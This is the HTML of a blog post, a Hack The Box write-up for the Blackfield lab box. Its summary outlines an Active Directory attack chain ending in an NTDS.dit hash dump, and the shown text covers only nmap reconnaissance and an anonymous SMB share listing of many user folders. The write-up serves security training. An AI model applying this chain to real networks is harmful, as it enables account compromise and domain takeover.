@@ -1,0 +1,2270 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="Summary Blackfield is hard Windows box. Account enumeration is easy because the box has anonymous access to profiles$ share. That allowed to build custom list for users and find an account with DONT_REQ_PREAUTH flag set: support. The account has policy allowed to change password for non-admin accounts and thus gain access to memory dumps made by audit2020 account. Extracted NTLM hash for svc_backup allowed login to the box and abuse sebackup/serestore to root the domain and then extract administrator ntlm hash from NTDS." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="http://foxmaccloud.com/writeups/hackthebox/blackfield/" />
+
+
+    <title>
+        
+            Blackfield - Hack The Box :: FoxCorp  — Welcome to FoxCorp!
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.d1ea4af8fd04fb24a4f8b882ea54bd04eb245427ca4baf527c81a5dab071410b.css">
+
+
+
+
+
+
+<meta itemprop="name" content="Blackfield - Hack The Box">
+<meta itemprop="description" content="Summary Blackfield is hard Windows box. Account enumeration is easy because the box has anonymous access to profiles$ share. That allowed to build custom list for users and find an account with DONT_REQ_PREAUTH flag set: support. The account has policy allowed to change password for non-admin accounts and thus gain access to memory dumps made by audit2020 account. Extracted NTLM hash for svc_backup allowed login to the box and abuse sebackup/serestore to root the domain and then extract administrator ntlm hash from NTDS.">
+<meta itemprop="datePublished" content="2020-06-07T20:02:01+02:00" />
+<meta itemprop="dateModified" content="2020-06-07T20:02:01+02:00" />
+<meta itemprop="wordCount" content="9478">
+<meta itemprop="image" content="http://foxmaccloud.com/"/>
+
+
+
+<meta itemprop="keywords" content="" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="http://foxmaccloud.com/"/>
+
+<meta name="twitter:title" content="Blackfield - Hack The Box"/>
+<meta name="twitter:description" content="Summary Blackfield is hard Windows box. Account enumeration is easy because the box has anonymous access to profiles$ share. That allowed to build custom list for users and find an account with DONT_REQ_PREAUTH flag set: support. The account has policy allowed to change password for non-admin accounts and thus gain access to memory dumps made by audit2020 account. Extracted NTLM hash for svc_backup allowed login to the box and abuse sebackup/serestore to root the domain and then extract administrator ntlm hash from NTDS."/>
+
+
+
+    <meta property="og:title" content="Blackfield - Hack The Box" />
+<meta property="og:description" content="Summary Blackfield is hard Windows box. Account enumeration is easy because the box has anonymous access to profiles$ share. That allowed to build custom list for users and find an account with DONT_REQ_PREAUTH flag set: support. The account has policy allowed to change password for non-admin accounts and thus gain access to memory dumps made by audit2020 account. Extracted NTLM hash for svc_backup allowed login to the box and abuse sebackup/serestore to root the domain and then extract administrator ntlm hash from NTDS." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://foxmaccloud.com/writeups/hackthebox/blackfield/" />
+<meta property="og:image" content="http://foxmaccloud.com/"/>
+<meta property="article:published_time" content="2020-06-07T20:02:01+02:00" />
+<meta property="article:modified_time" content="2020-06-07T20:02:01+02:00" /><meta property="og:site_name" content="FoxCorp" />
+
+
+
+
+
+
+    <meta property="article:published_time" content="2020-06-07 20:02:01 &#43;0200 CEST" />
+
+
+
+
+
+
+
+
+    </head>
+
+    <body class="dark-theme">
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">$ cd /home/</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="http://foxmaccloud.com/posts/">Posts</a></li><li><a href="http://foxmaccloud.com/whoami/">whoami</a></li><li><a href="http://foxmaccloud.com/writeups/">Writeups</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+
+            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+</span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            <h2 class="post-title"><a href="http://foxmaccloud.com/writeups/hackthebox/blackfield/">Blackfield - Hack The Box</a></h2>
+
+            
+
+            
+
+            <div class="post-content">
+                <h2 id="summary">Summary</h2>
+<p>Blackfield is hard Windows box. Account enumeration is easy because the box has anonymous access to <code>profiles$</code> share. That allowed to build custom list for users and find an account with <code>DONT_REQ_PREAUTH</code> flag set: support. The account has policy allowed to change password for non-admin accounts and thus gain access to memory dumps made by <code>audit2020</code> account. Extracted NTLM hash for <code>svc_backup</code> allowed login to the box and abuse sebackup/serestore to root the domain and then extract administrator ntlm hash from NTDS.dit, and then wmiexec or winrm to read the flag with the security context of administrator user</p>
+<h2 id="enumeration">Enumeration</h2>
+<ol>
+<li>Opened ports:</li>
+</ol>
+<ul>
+<li>quick summary:</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nmap -A -T5 -Pn -oN initial-nmap-scan 10.10.10.192
+
+Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2020-06-09 15:00 CEST
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.192
+Host is up <span style="color:#f92672">(</span>0.037s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">993</span> filtered ports
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain?
+| fingerprint-strings:
+|   DNSVersionBindReqTCP:
+|     version
+|_    bind
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2020-06-09 18:01:57Z<span style="color:#f92672">)</span>
+135/tcp  open  msrpc         Microsoft Windows RPC
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: BLACKFIELD.local0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+445/tcp  open  microsoft-ds?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: BLACKFIELD.local0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+<span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port53-TCP:V<span style="color:#f92672">=</span>7.80%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>6/9%Time<span style="color:#f92672">=</span>5EDF881A%P<span style="color:#f92672">=</span>x86_64-unknown-linux-gnu%r<span style="color:#f92672">(</span>
+SF:DNSVersionBindReqTCP,20,<span style="color:#e6db74">&#34;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07vers
+</span><span style="color:#e6db74">SF:ion\x04bind\0\0\x10\0\x03&#34;</span><span style="color:#f92672">)</span>;
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: 5h00m46s
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled and required
+| smb2-time:
+|   date: 2020-06-09T18:04:14
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 188.57 seconds                                  
+</code></pre></div><ul>
+<li>UDP ports:</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nmap -A -T5 -Pn -sUV -p <span style="color:#ae81ff">100</span> -oN initial-UDP-nmap-scan 10.10.10.192
+
+Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2020-06-09 15:53 CEST
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.192
+Host is up.
+
+PORT    STATE         SERVICE VERSION
+100/udp open|filtered unknown
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 99.45 seconds
+</code></pre></div><ol start="2">
+<li>SMB listing:</li>
+</ol>
+<pre><code>smbclient -L //10.10.10.192
+Enter WORKGROUP\foxmaccloud's password:
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	forensic        Disk      Forensic / Audit share.
+	IPC$            IPC       Remote IPC
+	NETLOGON        Disk      Logon server share
+	profiles$       Disk      
+	SYSVOL          Disk      Logon server share
+SMB1 disabled -- no workgroup available
+</code></pre><pre><code>smbclient //10.10.10.192/profiles$
+Enter WORKGROUP\foxmaccloud's password:
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Wed Jun  3 18:47:12 2020
+  ..                                  D        0  Wed Jun  3 18:47:12 2020
+  AAlleni                             D        0  Wed Jun  3 18:47:11 2020
+  ABarteski                           D        0  Wed Jun  3 18:47:11 2020
+  ABekesz                             D        0  Wed Jun  3 18:47:11 2020
+  ABenzies                            D        0  Wed Jun  3 18:47:11 2020
+  ABiemiller                          D        0  Wed Jun  3 18:47:11 2020
+  AChampken                           D        0  Wed Jun  3 18:47:11 2020
+  ACheretei                           D        0  Wed Jun  3 18:47:11 2020
+  ACsonaki                            D        0  Wed Jun  3 18:47:11 2020
+  AHigchens                           D        0  Wed Jun  3 18:47:11 2020
+  AJaquemai                           D        0  Wed Jun  3 18:47:11 2020
+  AKlado                              D        0  Wed Jun  3 18:47:11 2020
+  AKoffenburger                       D        0  Wed Jun  3 18:47:11 2020
+  AKollolli                           D        0  Wed Jun  3 18:47:11 2020
+  AKruppe                             D        0  Wed Jun  3 18:47:11 2020
+  AKubale                             D        0  Wed Jun  3 18:47:11 2020
+  ALamerz                             D        0  Wed Jun  3 18:47:11 2020
+  AMaceldon                           D        0  Wed Jun  3 18:47:11 2020
+  AMasalunga                          D        0  Wed Jun  3 18:47:11 2020
+  ANavay                              D        0  Wed Jun  3 18:47:11 2020
+  ANesterova                          D        0  Wed Jun  3 18:47:11 2020
+  ANeusse                             D        0  Wed Jun  3 18:47:11 2020
+  AOkleshen                           D        0  Wed Jun  3 18:47:11 2020
+  APustulka                           D        0  Wed Jun  3 18:47:11 2020
+  ARotella                            D        0  Wed Jun  3 18:47:11 2020
+  ASanwardeker                        D        0  Wed Jun  3 18:47:11 2020
+  AShadaia                            D        0  Wed Jun  3 18:47:11 2020
+  ASischo                             D        0  Wed Jun  3 18:47:11 2020
+  ASpruce                             D        0  Wed Jun  3 18:47:11 2020
+  ATakach                             D        0  Wed Jun  3 18:47:11 2020
+  ATaueg                              D        0  Wed Jun  3 18:47:11 2020
+  ATwardowski                         D        0  Wed Jun  3 18:47:11 2020
+  audit2020                           D        0  Wed Jun  3 18:47:11 2020
+  AWangenheim                         D        0  Wed Jun  3 18:47:11 2020
+  AWorsey                             D        0  Wed Jun  3 18:47:11 2020
+  AZigmunt                            D        0  Wed Jun  3 18:47:11 2020
+  BBakajza                            D        0  Wed Jun  3 18:47:11 2020
+  BBeloucif                           D        0  Wed Jun  3 18:47:11 2020
+  BCarmitcheal                        D        0  Wed Jun  3 18:47:11 2020
+  BConsultant                         D        0  Wed Jun  3 18:47:11 2020
+  BErdossy                            D        0  Wed Jun  3 18:47:11 2020
+  BGeminski                           D        0  Wed Jun  3 18:47:11 2020
+  BLostal                             D        0  Wed Jun  3 18:47:11 2020
+  BMannise                            D        0  Wed Jun  3 18:47:11 2020
+  BNovrotsky                          D        0  Wed Jun  3 18:47:11 2020
+  BRigiero                            D        0  Wed Jun  3 18:47:11 2020
+  BSamkoses                           D        0  Wed Jun  3 18:47:11 2020
+  BZandonella                         D        0  Wed Jun  3 18:47:11 2020
+  CAcherman                           D        0  Wed Jun  3 18:47:12 2020
+  CAkbari                             D        0  Wed Jun  3 18:47:12 2020
+  CAldhowaihi                         D        0  Wed Jun  3 18:47:12 2020
+  CArgyropolous                       D        0  Wed Jun  3 18:47:12 2020
+  CDufrasne                           D        0  Wed Jun  3 18:47:12 2020
+  CGronk                              D        0  Wed Jun  3 18:47:11 2020
+  Chiucarello                         D        0  Wed Jun  3 18:47:11 2020
+  Chiuccariello                       D        0  Wed Jun  3 18:47:12 2020
+  CHoytal                             D        0  Wed Jun  3 18:47:12 2020
+  CKijauskas                          D        0  Wed Jun  3 18:47:12 2020
+  CKolbo                              D        0  Wed Jun  3 18:47:12 2020
+  CMakutenas                          D        0  Wed Jun  3 18:47:12 2020
+  CMorcillo                           D        0  Wed Jun  3 18:47:11 2020
+  CSchandall                          D        0  Wed Jun  3 18:47:12 2020
+  CSelters                            D        0  Wed Jun  3 18:47:12 2020
+  CTolmie                             D        0  Wed Jun  3 18:47:12 2020
+  DCecere                             D        0  Wed Jun  3 18:47:12 2020
+  DChintalapalli                      D        0  Wed Jun  3 18:47:12 2020
+  DCwilich                            D        0  Wed Jun  3 18:47:12 2020
+  DGarbatiuc                          D        0  Wed Jun  3 18:47:12 2020
+  DKemesies                           D        0  Wed Jun  3 18:47:12 2020
+  DMatuka                             D        0  Wed Jun  3 18:47:12 2020
+  DMedeme                             D        0  Wed Jun  3 18:47:12 2020
+  DMeherek                            D        0  Wed Jun  3 18:47:12 2020
+  DMetych                             D        0  Wed Jun  3 18:47:12 2020
+  DPaskalev                           D        0  Wed Jun  3 18:47:12 2020
+  DPriporov                           D        0  Wed Jun  3 18:47:12 2020
+  DRusanovskaya                       D        0  Wed Jun  3 18:47:12 2020
+  DVellela                            D        0  Wed Jun  3 18:47:12 2020
+  DVogleson                           D        0  Wed Jun  3 18:47:12 2020
+  DZwinak                             D        0  Wed Jun  3 18:47:12 2020
+  EBoley                              D        0  Wed Jun  3 18:47:12 2020
+  EEulau                              D        0  Wed Jun  3 18:47:12 2020
+  EFeatherling                        D        0  Wed Jun  3 18:47:12 2020
+  EFrixione                           D        0  Wed Jun  3 18:47:12 2020
+  EJenorik                            D        0  Wed Jun  3 18:47:12 2020
+  EKmilanovic                         D        0  Wed Jun  3 18:47:12 2020
+  ElKatkowsky                         D        0  Wed Jun  3 18:47:12 2020
+  EmaCaratenuto                       D        0  Wed Jun  3 18:47:12 2020
+  EPalislamovic                       D        0  Wed Jun  3 18:47:12 2020
+  EPryar                              D        0  Wed Jun  3 18:47:12 2020
+  ESachhitello                        D        0  Wed Jun  3 18:47:12 2020
+  ESariotti                           D        0  Wed Jun  3 18:47:12 2020
+  ETurgano                            D        0  Wed Jun  3 18:47:12 2020
+  EWojtila                            D        0  Wed Jun  3 18:47:12 2020
+  FAlirezai                           D        0  Wed Jun  3 18:47:12 2020
+  FBaldwind                           D        0  Wed Jun  3 18:47:12 2020
+  FBroj                               D        0  Wed Jun  3 18:47:12 2020
+  FDeblaquire                         D        0  Wed Jun  3 18:47:12 2020
+  FDegeorgio                          D        0  Wed Jun  3 18:47:12 2020
+  FianLaginja                         D        0  Wed Jun  3 18:47:12 2020
+  FLasokowski                         D        0  Wed Jun  3 18:47:12 2020
+  FPflum                              D        0  Wed Jun  3 18:47:12 2020
+  FReffey                             D        0  Wed Jun  3 18:47:12 2020
+  GaBelithe                           D        0  Wed Jun  3 18:47:12 2020
+  Gareld                              D        0  Wed Jun  3 18:47:12 2020
+  GBatowski                           D        0  Wed Jun  3 18:47:12 2020
+  GForshalger                         D        0  Wed Jun  3 18:47:12 2020
+  GGomane                             D        0  Wed Jun  3 18:47:12 2020
+  GHisek                              D        0  Wed Jun  3 18:47:12 2020
+  GMaroufkhani                        D        0  Wed Jun  3 18:47:12 2020
+  GMerewether                         D        0  Wed Jun  3 18:47:12 2020
+  GQuinniey                           D        0  Wed Jun  3 18:47:12 2020
+  GRoswurm                            D        0  Wed Jun  3 18:47:12 2020
+  GWiegard                            D        0  Wed Jun  3 18:47:12 2020
+  HBlaziewske                         D        0  Wed Jun  3 18:47:12 2020
+  HColantino                          D        0  Wed Jun  3 18:47:12 2020
+  HConforto                           D        0  Wed Jun  3 18:47:12 2020
+  HCunnally                           D        0  Wed Jun  3 18:47:12 2020
+  HGougen                             D        0  Wed Jun  3 18:47:12 2020
+  HKostova                            D        0  Wed Jun  3 18:47:12 2020
+  IChristijr                          D        0  Wed Jun  3 18:47:12 2020
+  IKoledo                             D        0  Wed Jun  3 18:47:12 2020
+  IKotecky                            D        0  Wed Jun  3 18:47:12 2020
+  ISantosi                            D        0  Wed Jun  3 18:47:12 2020
+  JAngvall                            D        0  Wed Jun  3 18:47:12 2020
+  JBehmoiras                          D        0  Wed Jun  3 18:47:12 2020
+  JDanten                             D        0  Wed Jun  3 18:47:12 2020
+  JDjouka                             D        0  Wed Jun  3 18:47:12 2020
+  JKondziola                          D        0  Wed Jun  3 18:47:12 2020
+  JLeytushsenior                      D        0  Wed Jun  3 18:47:12 2020
+  JLuthner                            D        0  Wed Jun  3 18:47:12 2020
+  JMoorehendrickson                   D        0  Wed Jun  3 18:47:12 2020
+  JPistachio                          D        0  Wed Jun  3 18:47:12 2020
+  JScima                              D        0  Wed Jun  3 18:47:12 2020
+  JSebaali                            D        0  Wed Jun  3 18:47:12 2020
+  JShoenherr                          D        0  Wed Jun  3 18:47:12 2020
+  JShuselvt                           D        0  Wed Jun  3 18:47:12 2020
+  KAmavisca                           D        0  Wed Jun  3 18:47:12 2020
+  KAtolikian                          D        0  Wed Jun  3 18:47:12 2020
+  KBrokinn                            D        0  Wed Jun  3 18:47:12 2020
+  KCockeril                           D        0  Wed Jun  3 18:47:12 2020
+  KColtart                            D        0  Wed Jun  3 18:47:12 2020
+  KCyster                             D        0  Wed Jun  3 18:47:12 2020
+  KDorney                             D        0  Wed Jun  3 18:47:12 2020
+  KKoesno                             D        0  Wed Jun  3 18:47:12 2020
+  KLangfur                            D        0  Wed Jun  3 18:47:12 2020
+  KMahalik                            D        0  Wed Jun  3 18:47:12 2020
+  KMasloch                            D        0  Wed Jun  3 18:47:12 2020
+  KMibach                             D        0  Wed Jun  3 18:47:12 2020
+  KParvankova                         D        0  Wed Jun  3 18:47:12 2020
+  KPregnolato                         D        0  Wed Jun  3 18:47:12 2020
+  KRasmor                             D        0  Wed Jun  3 18:47:12 2020
+  KShievitz                           D        0  Wed Jun  3 18:47:12 2020
+  KSojdelius                          D        0  Wed Jun  3 18:47:12 2020
+  KTambourgi                          D        0  Wed Jun  3 18:47:12 2020
+  KVlahopoulos                        D        0  Wed Jun  3 18:47:12 2020
+  KZyballa                            D        0  Wed Jun  3 18:47:12 2020
+  LBajewsky                           D        0  Wed Jun  3 18:47:12 2020
+  LBaligand                           D        0  Wed Jun  3 18:47:12 2020
+  LBarhamand                          D        0  Wed Jun  3 18:47:12 2020
+  LBirer                              D        0  Wed Jun  3 18:47:12 2020
+  LBobelis                            D        0  Wed Jun  3 18:47:12 2020
+  LChippel                            D        0  Wed Jun  3 18:47:12 2020
+  LChoffin                            D        0  Wed Jun  3 18:47:12 2020
+  LCominelli                          D        0  Wed Jun  3 18:47:12 2020
+  LDruge                              D        0  Wed Jun  3 18:47:12 2020
+  LEzepek                             D        0  Wed Jun  3 18:47:12 2020
+  LHyungkim                           D        0  Wed Jun  3 18:47:12 2020
+  LKarabag                            D        0  Wed Jun  3 18:47:12 2020
+  LKirousis                           D        0  Wed Jun  3 18:47:12 2020
+  LKnade                              D        0  Wed Jun  3 18:47:12 2020
+  LKrioua                             D        0  Wed Jun  3 18:47:12 2020
+  LLefebvre                           D        0  Wed Jun  3 18:47:12 2020
+  LLoeradeavilez                      D        0  Wed Jun  3 18:47:12 2020
+  LMichoud                            D        0  Wed Jun  3 18:47:12 2020
+  LTindall                            D        0  Wed Jun  3 18:47:12 2020
+  LYturbe                             D        0  Wed Jun  3 18:47:12 2020
+  MArcynski                           D        0  Wed Jun  3 18:47:12 2020
+  MAthilakshmi                        D        0  Wed Jun  3 18:47:12 2020
+  MAttravanam                         D        0  Wed Jun  3 18:47:12 2020
+  MBrambini                           D        0  Wed Jun  3 18:47:12 2020
+  MHatziantoniou                      D        0  Wed Jun  3 18:47:12 2020
+  MHoerauf                            D        0  Wed Jun  3 18:47:12 2020
+  MKermarrec                          D        0  Wed Jun  3 18:47:12 2020
+  MKillberg                           D        0  Wed Jun  3 18:47:12 2020
+  MLapesh                             D        0  Wed Jun  3 18:47:12 2020
+  MMakhsous                           D        0  Wed Jun  3 18:47:12 2020
+  MMerezio                            D        0  Wed Jun  3 18:47:12 2020
+  MNaciri                             D        0  Wed Jun  3 18:47:12 2020
+  MShanmugarajah                      D        0  Wed Jun  3 18:47:12 2020
+  MSichkar                            D        0  Wed Jun  3 18:47:12 2020
+  MTemko                              D        0  Wed Jun  3 18:47:12 2020
+  MTipirneni                          D        0  Wed Jun  3 18:47:12 2020
+  MTonuri                             D        0  Wed Jun  3 18:47:12 2020
+  MVanarsdel                          D        0  Wed Jun  3 18:47:12 2020
+  NBellibas                           D        0  Wed Jun  3 18:47:12 2020
+  NDikoka                             D        0  Wed Jun  3 18:47:12 2020
+  NGenevro                            D        0  Wed Jun  3 18:47:12 2020
+  NGoddanti                           D        0  Wed Jun  3 18:47:12 2020
+  NMrdirk                             D        0  Wed Jun  3 18:47:12 2020
+  NPulido                             D        0  Wed Jun  3 18:47:12 2020
+  NRonges                             D        0  Wed Jun  3 18:47:12 2020
+  NSchepkie                           D        0  Wed Jun  3 18:47:12 2020
+  NVanpraet                           D        0  Wed Jun  3 18:47:12 2020
+  OBelghazi                           D        0  Wed Jun  3 18:47:12 2020
+  OBushey                             D        0  Wed Jun  3 18:47:12 2020
+  OHardybala                          D        0  Wed Jun  3 18:47:12 2020
+  OLunas                              D        0  Wed Jun  3 18:47:12 2020
+  ORbabka                             D        0  Wed Jun  3 18:47:12 2020
+  PBourrat                            D        0  Wed Jun  3 18:47:12 2020
+  PBozzelle                           D        0  Wed Jun  3 18:47:12 2020
+  PBranti                             D        0  Wed Jun  3 18:47:12 2020
+  PCapperella                         D        0  Wed Jun  3 18:47:12 2020
+  PCurtz                              D        0  Wed Jun  3 18:47:12 2020
+  PDoreste                            D        0  Wed Jun  3 18:47:12 2020
+  PGegnas                             D        0  Wed Jun  3 18:47:12 2020
+  PMasulla                            D        0  Wed Jun  3 18:47:12 2020
+  PMendlinger                         D        0  Wed Jun  3 18:47:12 2020
+  PParakat                            D        0  Wed Jun  3 18:47:12 2020
+  PProvencer                          D        0  Wed Jun  3 18:47:12 2020
+  PTesik                              D        0  Wed Jun  3 18:47:12 2020
+  PVinkovich                          D        0  Wed Jun  3 18:47:12 2020
+  PVirding                            D        0  Wed Jun  3 18:47:12 2020
+  PWeinkaus                           D        0  Wed Jun  3 18:47:12 2020
+  RBaliukonis                         D        0  Wed Jun  3 18:47:12 2020
+  RBochare                            D        0  Wed Jun  3 18:47:12 2020
+  RKrnjaic                            D        0  Wed Jun  3 18:47:12 2020
+  RNemnich                            D        0  Wed Jun  3 18:47:12 2020
+  RPoretsky                           D        0  Wed Jun  3 18:47:12 2020
+  RStuehringer                        D        0  Wed Jun  3 18:47:12 2020
+  RSzewczuga                          D        0  Wed Jun  3 18:47:12 2020
+  RVallandas                          D        0  Wed Jun  3 18:47:12 2020
+  RWeatherl                           D        0  Wed Jun  3 18:47:12 2020
+  RWissor                             D        0  Wed Jun  3 18:47:12 2020
+  SAbdulagatov                        D        0  Wed Jun  3 18:47:12 2020
+  SAjowi                              D        0  Wed Jun  3 18:47:12 2020
+  SAlguwaihes                         D        0  Wed Jun  3 18:47:12 2020
+  SBonaparte                          D        0  Wed Jun  3 18:47:12 2020
+  SBouzane                            D        0  Wed Jun  3 18:47:12 2020
+  SChatin                             D        0  Wed Jun  3 18:47:12 2020
+  SDellabitta                         D        0  Wed Jun  3 18:47:12 2020
+  SDhodapkar                          D        0  Wed Jun  3 18:47:12 2020
+  SEulert                             D        0  Wed Jun  3 18:47:12 2020
+  SFadrigalan                         D        0  Wed Jun  3 18:47:12 2020
+  SGolds                              D        0  Wed Jun  3 18:47:12 2020
+  SGrifasi                            D        0  Wed Jun  3 18:47:12 2020
+  SGtlinas                            D        0  Wed Jun  3 18:47:12 2020
+  SHauht                              D        0  Wed Jun  3 18:47:12 2020
+  SHederian                           D        0  Wed Jun  3 18:47:12 2020
+  SHelregel                           D        0  Wed Jun  3 18:47:12 2020
+  SKrulig                             D        0  Wed Jun  3 18:47:12 2020
+  SLewrie                             D        0  Wed Jun  3 18:47:12 2020
+  SMaskil                             D        0  Wed Jun  3 18:47:12 2020
+  Smocker                             D        0  Wed Jun  3 18:47:12 2020
+  SMoyta                              D        0  Wed Jun  3 18:47:12 2020
+  SRaustiala                          D        0  Wed Jun  3 18:47:12 2020
+  SReppond                            D        0  Wed Jun  3 18:47:12 2020
+  SSicliano                           D        0  Wed Jun  3 18:47:12 2020
+  SSilex                              D        0  Wed Jun  3 18:47:12 2020
+  SSolsbak                            D        0  Wed Jun  3 18:47:12 2020
+  STousignaut                         D        0  Wed Jun  3 18:47:12 2020
+  support                             D        0  Wed Jun  3 18:47:12 2020
+  svc_backup                          D        0  Wed Jun  3 18:47:12 2020
+  SWhyte                              D        0  Wed Jun  3 18:47:12 2020
+  SWynigear                           D        0  Wed Jun  3 18:47:12 2020
+  TAwaysheh                           D        0  Wed Jun  3 18:47:12 2020
+  TBadenbach                          D        0  Wed Jun  3 18:47:12 2020
+  TCaffo                              D        0  Wed Jun  3 18:47:12 2020
+  TCassalom                           D        0  Wed Jun  3 18:47:12 2020
+  TEiselt                             D        0  Wed Jun  3 18:47:12 2020
+  TFerencdo                           D        0  Wed Jun  3 18:47:12 2020
+  TGaleazza                           D        0  Wed Jun  3 18:47:12 2020
+  TKauten                             D        0  Wed Jun  3 18:47:12 2020
+  TKnupke                             D        0  Wed Jun  3 18:47:12 2020
+  TLintlop                            D        0  Wed Jun  3 18:47:12 2020
+  TMusselli                           D        0  Wed Jun  3 18:47:12 2020
+  TOust                               D        0  Wed Jun  3 18:47:12 2020
+  TSlupka                             D        0  Wed Jun  3 18:47:12 2020
+  TStausland                          D        0  Wed Jun  3 18:47:12 2020
+  TZumpella                           D        0  Wed Jun  3 18:47:12 2020
+  UCrofskey                           D        0  Wed Jun  3 18:47:12 2020
+  UMarylebone                         D        0  Wed Jun  3 18:47:12 2020
+  UPyrke                              D        0  Wed Jun  3 18:47:12 2020
+  VBublavy                            D        0  Wed Jun  3 18:47:12 2020
+  VButziger                           D        0  Wed Jun  3 18:47:12 2020
+  VFuscca                             D        0  Wed Jun  3 18:47:12 2020
+  VLitschauer                         D        0  Wed Jun  3 18:47:12 2020
+  VMamchuk                            D        0  Wed Jun  3 18:47:12 2020
+  VMarija                             D        0  Wed Jun  3 18:47:12 2020
+  VOlaosun                            D        0  Wed Jun  3 18:47:12 2020
+  VPapalouca                          D        0  Wed Jun  3 18:47:12 2020
+  WSaldat                             D        0  Wed Jun  3 18:47:12 2020
+  WVerzhbytska                        D        0  Wed Jun  3 18:47:12 2020
+  WZelazny                            D        0  Wed Jun  3 18:47:12 2020
+  XBemelen                            D        0  Wed Jun  3 18:47:12 2020
+  XDadant                             D        0  Wed Jun  3 18:47:12 2020
+  XDebes                              D        0  Wed Jun  3 18:47:12 2020
+  XKonegni                            D        0  Wed Jun  3 18:47:12 2020
+  XRykiel                             D        0  Wed Jun  3 18:47:12 2020
+  YBleasdale                          D        0  Wed Jun  3 18:47:12 2020
+  YHuftalin                           D        0  Wed Jun  3 18:47:12 2020
+  YKivlen                             D        0  Wed Jun  3 18:47:12 2020
+  YKozlicki                           D        0  Wed Jun  3 18:47:12 2020
+  YNyirenda                           D        0  Wed Jun  3 18:47:12 2020
+  YPredestin                          D        0  Wed Jun  3 18:47:12 2020
+  YSeturino                           D        0  Wed Jun  3 18:47:12 2020
+  YSkoropada                          D        0  Wed Jun  3 18:47:12 2020
+  YVonebers                           D        0  Wed Jun  3 18:47:12 2020
+  YZarpentine                         D        0  Wed Jun  3 18:47:12 2020
+  ZAlatti                             D        0  Wed Jun  3 18:47:12 2020
+  ZKrenselewski                       D        0  Wed Jun  3 18:47:12 2020
+  ZMalaab                             D        0  Wed Jun  3 18:47:12 2020
+  ZMiick                              D        0  Wed Jun  3 18:47:12 2020
+  ZScozzari                           D        0  Wed Jun  3 18:47:12 2020
+  ZTimofeeff                          D        0  Wed Jun  3 18:47:12 2020
+  ZWausik                             D        0  Wed Jun  3 18:47:12 2020
+
+		7846143 blocks of size 4096. 3909106 blocks available
+smb: \&gt;
